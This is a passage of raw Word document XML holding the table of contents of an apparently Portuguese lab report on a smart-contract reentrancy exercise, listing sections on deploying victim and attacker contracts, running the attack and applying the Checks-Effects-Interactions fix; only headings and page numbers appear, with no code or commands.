                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="41ECACEE" w14:textId="0BF17C8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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.3 Deploy do Contrato Vítima</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881944 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2FB2F151" w14:textId="319002CD"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.4 Financiamento do Contrato</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881945 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7EE07582" w14:textId="293EA098"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.5 Teste de Retirada Normal</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881946 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0408E834" w14:textId="3A4726C4"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4. Task 2: Deploy do Contrato Atacante</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881947 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="64C0BCA0" w14:textId="60FF8014"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1 Análise do Contrato de Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881948 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="511126A2" w14:textId="18F83ADF"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49" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.2 Compilação</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881949 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1A03ECE5" w14:textId="7BA0C850"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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.3 Deploy do Contrato Atacante</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881950 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="23A3D114" w14:textId="2689A8D9"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5. Task 3: Execução do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881951 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5E98B578" w14:textId="6E06B071"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5.1 Preparação do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881952 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2376A831" w14:textId="0A4A2ACF"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5.2 Execução</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881953 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1A1F3359" w14:textId="22A9AF9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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5.3 Verificação dos Resultados</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881954 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3A01A51D" w14:textId="6D6E7A65"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5.4 Análise no EtherView</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881955 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6C2823D2" w14:textId="2334E7A9"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5.5 Cash Out</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881956 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5AF32AC5" w14:textId="2E12AED7"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7" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>6. Análise Técnica do Ataque</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881957 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3DBCAE98" w14:textId="74DAB936"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8" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>6.1 Sequência de Execução Observada</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881958 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0A82CDB2" w14:textId="53C98F09"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59" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>6.2 Por Que a Vulnerabilidade Existe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881959 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5719DC49" w14:textId="5244017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0" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>6.3 Diagrama da Pilha de Chamadas</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881960 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1624C652" w14:textId="367DD17C"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1" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7. Task 4: Implementação de Contramedidas</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881961 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1BD8FD8D" w14:textId="38E77D73"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2" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7.1 Solução Implementada: Checks-Effects-Interactions Pattern</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881962 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6E83C1D1" w14:textId="454878EA"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3" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7.2 Recompilação e Deploy</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881963 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4FAF6696" w14:textId="062E97C0"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4" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7.3 Teste do Ataque no Contrato Corrigido</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881964 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="16FF657B" w14:textId="0A31C67D"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5" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7.4 Verificação dos Saldos</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc213881965 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5EE4E31E" w14:textId="18E2D124"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6" w:history="1">
            <w:r w:rsidRPr="00F74358">
              <w:rPr>
                <w:rStyle w:val="Hiperligao"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7.5 Outras Soluções Avaliadas</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
